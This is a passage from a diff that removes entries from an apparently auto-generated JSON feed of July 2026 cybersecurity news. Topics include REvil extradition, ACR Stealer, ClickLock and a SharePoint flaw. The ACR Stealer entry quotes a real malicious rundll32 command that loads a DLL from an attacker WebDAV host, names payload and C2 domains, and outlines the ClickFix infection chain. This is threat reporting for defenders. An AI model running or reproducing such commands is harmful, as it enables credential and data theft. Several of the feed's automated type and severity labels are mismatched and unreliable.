-    "article_text": "Armenia has held a Russian tourist named Aleksandr Ermakov in a detention center since June 28, on a U.S. extradition request for a REvil ransomware suspect named Aleksandr Ermakov. His wife, Maria Yurova, told REN TV that border officers pulled him out of the departure hall at Yerevan's Zvartnots airport, held up a phone with a photo of him off his VKontakte page, and walked him into a side room. His lawyers say Washington has the wrong man. The Ermakov the U.S. wants is Aleksandr Gennadievich Ermakov , sanctioned by Australia, the US, and the UK in January 2024 for stealing 9.7 million records from Medibank Private , one of Australia's largest private health insurers, and dumping some on the dark web. He is also serving a two-year Russian sentence that bars him from leaving the country, according to TASS and to case files two Russian outlets say they have read. The man in the Armenian cell, his lawyers say, is Aleksandr Yuryevich Ermakov , from Omsk, a former prison-service lawyer who does not speak English. Ermakov is accused of taking part in Sodinokibi/REvil attacks from roughly April 2019 to July 12, 2021, with more than 1,000 victims among private companies, law enforcement, government offices, schools, and hospitals, some in the Northern District of Texas. That comes from the US charging document, which RIA Novosti says it holds. The Interpol notice built on it, which Izvestia says it has, goes further: one of the platform's administrators, with a take of over $13.7 million. Channel Five dates the warrant to that district's federal court, June 26, two days before the arrest. Medibank was hacked in October 2022, fifteen months after that window closes, and the US has never announced a charge against Ermakov over it. Treasury's designation put him at REvil's edge, an actor \"believed to be linked\" to the gang. The notice puts him at its center. That court has seen REvil before: DOJ charged Yevgeniy Polyanin there in 2021 over Sodinokibi/REvil attacks on Texas businesses and government entities on or about August 16, 2019. Russian passports carry a patronymic, and it is the field that tells one Aleksandr Ermakov from the next. Australia's consolidated list has it: Aleksandr Gennadievich Ermakov, born 16 May 1990. The UK's entry has it . OFAC's does not . The SDN record runs: ERMAKOV, Aleksandr, Moscow, DOB 16 May 1990, male, one Yandex address, four handles (blade_runner, GistaveDore, GustaveDore, JimJones). Given name, surname, nothing in between. What the Interpol notice itself carries is not public. Dylan Rajavi, one of the detained man's lawyers, told Izvestia the defense's working theory is that the U.S. paperwork carried a given name and a surname, no more, and an automated check did the rest. He also said there are standard ways to settle who someone is, fingerprints or full passport data, and that neither has been produced. \"There is only an arrest warrant,\" he said. That is the defense's account, not a finding. Armenian authorities have said nothing, the Justice Department has announced no charges, and none of the Russian outlets holding the documents says how it got them. Nor are there as many outlets as they look: Izvestia, REN TV, and Channel Five all sit under National Media Group , and Izvestia's newsroom has supplied the news for the other two since 2017. The man is being held on a 30-day Interpol detention order while Moscow asks Yerevan for consular access. Australia's signals directorate and federal police spent 18 months on Operation Aquila before naming him. And the chain from the sanctioned Ermakov to SugarLocker does not run through Russian state media. Once Australia published the nicknames, Intel 471 went back through years of collected forum data. SHTAZI and shtaziIT were among Ermakov's handles, it reported, and his alias JimJones had spent 2019 and 2020 on the Exploit forum hawking malware development and a dev shop called Shtazi-IT. A month later, Russian police said they had rolled up the S ugarLocker ransomware crew operating behind Shtazi-IT, with @GustaveDore sitting in the contact field of its developer job ads. A US vendor and Russia's interior ministry reached the same shopfront from opposite ends. In October 2024, a Moscow court gave Ermakov two years of restriction of freedom under Article 273(2), Russia's malware statute, for co-writing SugarLocker and selling it to a buyer with a Tor control panel attached. Case material seen by Izvestia says he pleaded guilty, and the case ",
-    "quick_summary": [
-      "Armenia has held a Russian tourist named Aleksandr Ermakov in a detention center since June 28, on a U.S.",
-      "Risk: ransomware/extortion, vulnerability/exploitation risk",
-      "Action: check affected products, patch status, and exposed services."
-    ],
-    "link": "https://thehackernews.com/2026/07/armenia-detains-russian-tourist-on-us.html",
-    "target": "Armenia Detains Russian Tourist",
-    "type": "Ransomware",
-    "severity": "Critical",
-    "sources": [
-      "The Hacker News"
-    ],
-    "links": [
-      {
-        "source": "The Hacker News",
-        "url": "https://thehackernews.com/2026/07/armenia-detains-russian-tourist-on-us.html"
-      }
-    ]
-  },
-  {
-    "id": "f3b319c2d54208ba",
-    "date": "2026-07-17T10:15:35+00:00",
-    "source": "Cyber Security News",
-    "quality": "Medium",
-    "scope": "General",
-    "category": "",
-    "title": "AWS Cost Explorer Bug Shows Trillion-Dollar Billing Estimates",
-    "summary": "AWS customers worldwide were startled after the AWS Billing and Cost Management Console and Cost Explorer began displaying extraordinarily high projected cloud costs. Some organizations reported estimated monthly bills reaching trillions of dollars, triggering budget alerts and prompting concerns over potential unauthorized AWS usage. AWS confirmed the issue through its Health Dashboard and AWS Support […] The post AWS Cost Explorer Bug Shows Trillion-Dollar Billing Estimates appeared first on Cyber Security News .",
-    "article_text": "",
-    "quick_summary": [
-      "AWS customers worldwide were startled after the AWS Billing and Cost Management Console and Cost Explorer began displaying extraordinarily high projected cloud costs.",
-      "Risk: general cybersecurity update",
-      "Action: read full article if the vendor/customer/environment is relevant."
-    ],
-    "link": "https://cybersecuritynews.com/aws-cost-explorer-bug/",
-    "target": "AWS Cost Explorer Shows",
-    "type": "General Cybersecurity",
-    "severity": "Medium",
-    "sources": [
-      "Cyber Security News"
-    ],
-    "links": [
-      {
-        "source": "Cyber Security News",
-        "url": "https://cybersecuritynews.com/aws-cost-explorer-bug/"
-      }
-    ]
-  },
-  {
-    "id": "c581455f11a1d379",
-    "date": "2026-07-17T10:00:24+00:00",
-    "source": "Palo Alto Unit 42",
-    "quality": "High",
-    "scope": "Research",
-    "category": "",
-    "title": "Three Steps to the Terminal: A Siemens ROX II Zero-Day Trilogy",
-    "summary": "A technical analysis of three chained zero-day vulnerabilities in Siemens ROX II OT switches that allow privilege escalation and persistent root access. The post Three Steps to the Terminal: A Siemens ROX II Zero-Day Trilogy appeared first on Unit 42 .",
-    "article_text": "",
-    "quick_summary": [
-      "A technical analysis of three chained zero-day vulnerabilities in Siemens ROX II OT switches that allow privilege escalation and persistent root access.",
-      "Risk: vulnerability/exploitation risk",
-      "Action: check affected products, patch status, and exposed services."
-    ],
-    "link": "https://unit42.paloaltonetworks.com/siemens-rox-ii-zero-day-vulnerabilities/",
-    "target": "Three Steps Terminal",
-    "type": "Vulnerability",
-    "severity": "Critical",
-    "sources": [
-      "Palo Alto Unit 42"
-    ],
-    "links": [
-      {
-        "source": "Palo Alto Unit 42",
-        "url": "https://unit42.paloaltonetworks.com/siemens-rox-ii-zero-day-vulnerabilities/"
-      }
-    ]
-  },
-  {
-    "id": "35009ba450d6c5bd",
-    "date": "2026-07-17T09:31:43+00:00",
-    "source": "Cyber Security News",
-    "quality": "Medium",
-    "scope": "General",
-    "category": "",
-    "title": "New ClickLock macOS Stealer Kills Every App to Force Password Entry",
-    "summary": "A newly discovered macOS malware dubbed ClickLock is raising alarms in the cybersecurity community for its aggressive and deceptive credential-harvesting techniques. According to researchers at Group-IB, the stealer employs a highly disruptive tactic that forcibly terminates running applications, effectively locking users out of their systems to coerce them into entering their macOS password. ClickLock represents […] The post New ClickLock macOS Stealer Kills Every App to Force Password Entry appeared first on Cyber Security News .",
-    "article_text": "",
-    "quick_summary": [
-      "A newly discovered macOS malware dubbed ClickLock is raising alarms in the cybersecurity community for its aggressive and deceptive credential-harvesting techniques.",
-      "Risk: credentials/infostealer risk, vulnerability/exploitation risk",
-      "Action: check affected products, patch status, and exposed services."
-    ],
-    "link": "https://cybersecuritynews.com/clicklock-macos-stealer/",
-    "target": "ClickLock Stealer Kills Every",
-    "type": "Vulnerability",
-    "severity": "Critical",
-    "sources": [
-      "Cyber Security News"
-    ],
-    "links": [
-      {
-        "source": "Cyber Security News",
-        "url": "https://cybersecuritynews.com/clicklock-macos-stealer/"
-      }
-    ]
-  },
-  {
-    "id": "3dd7dbe61524cecf",
-    "date": "2026-07-17T09:21:15.850927+00:00",
-    "source": "TechNadu",
-    "quality": "Medium",
-    "scope": "General",
-    "category": "",
-    "title": "Millions of Android Users at Risk as Study Reveals Serious Flaws in Free VPN Apps",
-    "summary": "Discovered from TechNadu page. Open full article for more details.",
-    "article_text": "",
-    "quick_summary": [
-      "Open full article for more details.",
-      "Risk: general cybersecurity update",
-      "Action: read full article if the vendor/customer/environment is relevant."
-    ],
-    "link": "https://www.technadu.com/free-android-vpn-apps-study-reveals-security-gaps/630771/",
-    "target": "Millions Android Users Risk",
-    "type": "General Cybersecurity",
-    "severity": "Low",
-    "sources": [
-      "TechNadu"
-    ],
-    "links": [
-      {
-        "source": "TechNadu",
-        "url": "https://www.technadu.com/free-android-vpn-apps-study-reveals-security-gaps/630771/"
-      }
-    ]
-  },
-  {
-    "id": "35ab032957172c4c",
-    "date": "2026-07-17T09:10:15+00:00",
-    "source": "BleepingComputer",
-    "quality": "High",
-    "scope": "General",
-    "category": "",
-    "title": "Windows Server 2022 reach end of mainstream support in 90 days",
-    "summary": "Microsoft announced that Windows Server 2022 will reach the mainstream end date in October 2026, but will switch to extended support and continue receiving security updates for five more years. [...]",
-    "article_text": "Microsoft announced that Windows Server 2022 will reach the mainstream end date in October 2026, but will switch to extended support and continue receiving security updates for five more years. Windows Server 2022 was first announced in March 2021 and became generally available in September 2021 as the Long-Term Servicing Channel (LTSC) release, with 10 years of support. \"On October 13, 2026, Windows Server 2022 will reach end of mainstream support. The October 2026 security update will be the last mainstream support update available for this version,\" Microsoft said in a message center update on Thursday. \"After this date, Windows Server 2022 will transition to extended support, which includes security updates at no additional cost, and will continue to receive monthly security updates through October 14, 2031.\" Customers are now advised to upgrade to Windows Server 2025 (the latest version of Microsoft's server operating system), which became generally available in November 2024 after first rolling out to Windows Insiders in January 2024 . Windows Server 2025 will reach the end of support on November 13, 2029, with extended support ending five years later, on November 14, 2034. Those who want to test Windows Server 2025 before deployment can use the free 180-day trial available through the Microsoft Evaluation Center . \"Windows Server 2025 is now the latest Long-Term Servicing Channel (LTSC) release for Windows Server. To help keep your environment protected and supported, plan to upgrade to Windows Server 2025 for full mainstream support,\" Microsoft noted.\"Evaluate upgrade options and begin deployment testing early to help ensure a smooth transition.\" You can find more information about Windows servicing dates using the Lifecycle Policy search tool or on the Windows Lifecycle FAQ page . Microsoft has also shared a list of products that will reach the end of support or will be retired in 2025 . Last month, Microsoft also announced that it has extended Windows Server 2022 hotpatching until October 2027, one year after its mainstream end date of October 2026, for systems running the Datacenter: Azure Edition, and quietly extended the free Windows 10 Extended Security Updates (ESU) program for consumers by an additional year. More recently, on Wednesday, Microsoft reminded customers that Windows 10 Enterprise LTSB 2016 and the Home and Pro editions of Windows 11 24H2 will stop receiving updates 3 months after reaching end of support. Security teams log 54% of successful attacks and alert on just 14%. The rest move through your environment unseen. The Picus whitepaper shows how breach and attack simulation tests your SIEM and EDR rules so threats stop slipping by detection. Microsoft extends Windows Server 2022 hotpatching until October 2027 Windows 11 24H2 Home and Pro reach end of support in 90 days Microsoft fixes GIF functionality in the Windows Emoji Panel Microsoft confirms April Windows updates cause backup failures Ernst & Young discloses data breach after support system hack Coca-Cola says Fairlife ransomware attack halts US dairy production New Windows LegacyHive zero-day gives hackers admin privileges Do you have what it takes to challenge DARKROOM? Signup for an exclusive DEFCON CTF! Privacy by policy or privacy by architecture? See how age checks work when the face never leaves the device. See how Pixellot discovered and secured hundreds of unmanaged AI agent identities in weeks, not months. Read the case study. Pentest your web apps on-demand. Find what humans miss. Scope and launch a pentest in minutes. AI broke vulnerability management. Get the guide CISOs use to shift budget to BAS. Read our posting guidelinese to learn what content is prohibited.",
-    "quick_summary": [
-      "Microsoft announced that Windows Server 2022 will reach the mainstream end date in October 2026, but will switch to extended support and continue receiving security updates for five more years.",
-      "Risk: vulnerability/exploitation risk, ISNET vendor relevance",
-      "Action: check affected products, patch status, and exposed services."
-    ],
-    "link": "https://www.bleepingcomputer.com/news/microsoft/windows-server-2022-reach-end-of-mainstream-support-in-90-days/",
-    "target": "Windows Server 2022",
-    "type": "Data Leak / Breach",
-    "severity": "Critical",
-    "sources": [
-      "BleepingComputer"
-    ],
-    "links": [
-      {
-        "source": "BleepingComputer",
-        "url": "https://www.bleepingcomputer.com/news/microsoft/windows-server-2022-reach-end-of-mainstream-support-in-90-days/"
-      }
-    ]
-  },
-  {
-    "id": "7e4ade4afaae5e23",
-    "date": "2026-07-17T09:06:27+00:00",
-    "source": "SecurityWeek",
-    "quality": "High",
-    "scope": "General",
-    "category": "",
-    "title": "Cyberattack Disrupts Operations of Japanese Frozen Food Giant Nichirei",
-    "summary": "The company disconnected its systems on July 13 and is starting to gradually restore operations. The post Cyberattack Disrupts Operations of Japanese Frozen Food Giant Nichirei appeared first on SecurityWeek .",
-    "article_text": "",
-    "quick_summary": [
-      "The company disconnected its systems on July 13 and is starting to gradually restore operations.",
-      "Risk: general cybersecurity update",
-      "Action: read full article if the vendor/customer/environment is relevant."
-    ],
-    "link": "https://www.securityweek.com/cyberattack-disrupts-operations-of-japanese-frozen-food-giant-nichirei/",
-    "target": "Cyberattack Disrupts Operations Japanese",
-    "type": "General Cybersecurity",
-    "severity": "Low",
-    "sources": [
-      "SecurityWeek"
-    ],
-    "links": [
-      {
-        "source": "SecurityWeek",
-        "url": "https://www.securityweek.com/cyberattack-disrupts-operations-of-japanese-frozen-food-giant-nichirei/"
-      }
-    ]
-  },
-  {
-    "id": "695c9ddf324883e9",
-    "date": "2026-07-17T08:56:39+00:00",
-    "source": "The Hacker News",
-    "quality": "High",
-    "scope": "General",
-    "category": "",
-    "title": "ACR Stealer Uses ClickFix Lures to Steal Browser Tokens and Microsoft 365 Files",
-    "summary": "ACR Stealer, an infostealer in circulation since 2024, is walking out of enterprise networks with saved browser passwords, live session tokens, PDFs, Microsoft 365 documents, and files from synced OneDrive and SharePoint folders. It gets in because someone pasted a command into a Run box and pressed Enter. Microsoft laid out two of the delivery chains on Thursday. Its Defender Experts team, the",
-    "article_text": "ACR Stealer , an infostealer in circulation since 2024, is walking out of enterprise networks with saved browser passwords, live session tokens, PDFs, Microsoft 365 documents, and files from synced OneDrive and SharePoint folders. It gets in because someone pasted a command into a Run box and pressed Enter. Microsoft laid out two of the delivery chains on Thursday. Its Defender Experts team, the company's managed detection arm, had watched ACR Stealer activity climb across customer environments from late April to mid-June, and says the campaigns are \"successfully using ClickFix lures to steal browser credentials, authentication tokens, and sensitive documents.\" Both chains open with the same prompt, then split: one leaves traces on disk, the other runs almost entirely in memory. Microsoft's remediation guidance tells victims to revoke tokens, not just rotate passwords. The prompt likely arrives through malvertising or SEO-manipulated search results, the report says. The fileless chain starts when the pasted command spawns mshta.exe to pull remote HTA content. An embedded VBScript loader leans on COM objects to decode and fire PowerShell; that stage mints a victim ID, disables certificate validation, and runs what it retrieves in memory. On May 26, SANS Internet Storm Center handler Brad Duncan documented a Windows infection he traced to a page impersonating Claude, Anthropic's AI assistant, reached through malicious Google ads and often hidden behind sites.google.com URLs. The page served macOS instructions when opened on a Mac and Windows instructions when opened on Windows. Microsoft never names the lure. Two of the indicators in its Campaign 2 table, creativecommunityinfo[.]art and enhanceblabber[.]cc , are listed as a payload host and a C2. The Hacker News matched both to Duncan's chain, which ran through subdomains of each seven weeks earlier, and Microsoft's report cites his diary among the references. That chain also pulled a 628 KB JPEG from ImgBB, an image-hosting service. He flagged it as part of the infection and got nothing out of it: \"nor could I find any obvious signs of embedded data.\" Red Canary had logged Claude-branded lures a month earlier, delivering ACR Stealer through fake Claude Code pages on GitLab such as claude-desktop[.]gitlab[.]io . Microsoft's first chain writes to disk, which leaves defenders more to work with. The pasted command pulls a DLL straight off a WebDAV share over HTTPS, using a GUID directory and a filename built to pass as something else; the report's example is google.ct . Red Canary published the same shape in its May report, from April telemetry, weeks before Microsoft's writeup: \"C:\\Windows\\system32\\rundll32.exe\" \\\\sphere-api.dialectosphere.in[.]net\\05fe317c-0981-4de2-bc8a-930d369db441\\ck-3d80df5d12cdfe6450a782fc87bf66b444.google,#1 Two of the three variants Defender Experts saw use pushd to mount the remote share as a temporary local drive first, so the payload runs through what looks like a local path. The stealthiest wraps that in conhost.exe --headless to kill the console window and hides the strings for pushd , rundll32 , and the remote host behind delayed environment-variable expansion. What follows is obfuscated PowerShell. It drops a ZIP into a folder under %LocalAppData%\\Temp with an innocuous name; Microsoft's example is LogiOptionsPlus . A bundled pythonw.exe then launches the Python script, so nothing flashes on screen. The installer wipes older copies before installing, which makes it an updater. It persists through a hidden scheduled task posing as a software update, copies timestamps off notepad.exe onto its own files, and clears PowerShell history behind it. The last stage stays in memory, handing execution through the Windows Fiber API. In a subset of these intrusions, a second Python loader talks to public blockchain RPC endpoints and Web3 node infrastructure, likely pulling a payload or a C2 address off a public ledger. Microsoft names the technique EtherHiding : put the pointer in a smart contract, and there is no attacker-controlled resolver left to seize. Neither chain exploits a vulnerability. Both inherit exactly what the signed-in user already has, and every layer downstream, the WebDAV mount, the pixel extraction, the in-memory handoff, only runs because a person read a prompt and pressed Enter. There is no CVE in this story. Patching does not remove the paste-and-run path. Microsoft says the lures are working, but never quantifies it. The report",
-    "quick_summary": [
-      "ACR Stealer, an infostealer in circulation since 2024, is walking out of enterprise networks with saved browser passwords, live session tokens, PDFs, Microsoft 365 documents, and files from synced OneDrive and SharePoint",
-      "Risk: credentials/infostealer risk, vulnerability/exploitation risk, ISNET vendor relevance",
-      "Action: check affected products, patch status, and exposed services."
-    ],
-    "link": "https://thehackernews.com/2026/07/acr-stealer-uses-clickfix-lures-to.html",
-    "target": "ACR Stealer Uses ClickFix",
-    "type": "Vulnerability",
-    "severity": "High",
-    "sources": [
-      "The Hacker News"
-    ],
-    "links": [
-      {
-        "source": "The Hacker News",
-        "url": "https://thehackernews.com/2026/07/acr-stealer-uses-clickfix-lures-to.html"
-      }
-    ]
-  },
-  {
-    "id": "f1da5b42c0585e99",
-    "date": "2026-07-17T08:47:16+00:00",
-    "source": "Cyber Security News",
-    "quality": "Medium",
-    "scope": "General",
-    "category": "",
-    "title": "CISA Warns of Microsoft SharePoint Code Execution Vulnerability Exploited in Attacks",
-    "summary": "CISA has added a critical Microsoft SharePoint vulnerability, tracked as CVE-2026-58644, to its Known Exploited Vulnerabilities (KEV) catalog. This addition comes with a warning that attackers are actively exploiting the flaw in real-world attacks. The vulnerability stems from a weakness in deserializing untrusted data, which can allow remote code execution if the application does not […] The post CISA Warns of Microsoft SharePoint Code Execution Vulnerability Exploited in Attacks appeared first on Cyber Security News .",
-    "article_text": "",
-    "quick_summary": [
-      "CISA has added a critical Microsoft SharePoint vulnerability, tracked as CVE-2026-58644, to its Known Exploited Vulnerabilities (KEV) catalog.",
-      "Risk: vulnerability/exploitation risk, ISNET vendor relevance",
-      "Action: check affected products, patch status, and exposed services."
-    ],
-    "link": "https://cybersecuritynews.com/microsoft-sharepoint-code-execution-vulnerability-exploited/",
-    "target": "CISA Microsoft SharePoint Code",
-    "type": "Vulnerability",
-    "severity": "Critical",
-    "sources": [
-      "Cyber Security News"
-    ],
-    "links": [
-      {
-        "source": "Cyber Security News",
-        "url": "https://cybersecuritynews.com/microsoft-sharepoint-code-execution-vulnerability-exploited/"
       }
     ]
   }
